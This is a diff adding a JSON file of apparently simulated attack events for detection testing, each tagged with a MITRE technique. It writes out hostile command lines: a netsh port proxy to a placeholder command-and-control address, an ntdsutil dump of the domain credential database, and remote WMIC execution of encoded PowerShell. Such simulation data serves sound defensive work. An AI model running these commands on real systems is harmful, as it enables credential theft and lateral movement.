@@ -1,0 +1,62 @@
+[
+  {
+    "name": "Network Proxying via Netsh",
+    "delay": 0.1,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "netsh.exe",
+        "ProcessCommandLine": "netsh interface portproxy add v4tov4 listenport=4444 connectaddress={{CNC_IP}} connectport=443",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "Administrator",
+        "DeviceName": "GW-INTERNAL-01",
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1090",
+          "technique_name": "Proxy: Internal Proxy"
+        }
+      }
+    ]
+  },
+  {
+    "name": "Stealthy Credential Dumping",
+    "delay": 5.0,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "ntdsutil.exe",
+        "ProcessCommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\dump\" q q",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "DomainAdmin",
+        "DeviceName": "DC-PROD-01",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.003",
+          "technique_name": "OS Credential Dumping: NTDS"
+        }
+      }
+    ]
+  },
+  {
+    "name": "Internal Recon via WMIC",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "wmic.exe",
+        "ProcessCommandLine": "wmic /node:{{RANDOM_IP}} process call create \"powershell.exe -enc ...\"",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "Administrator",
+        "DeviceName": "GW-INTERNAL-01",
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1047",
+          "technique_name": "Windows Management Instrumentation"
+        }
+      }
+    ]
+  }
+]
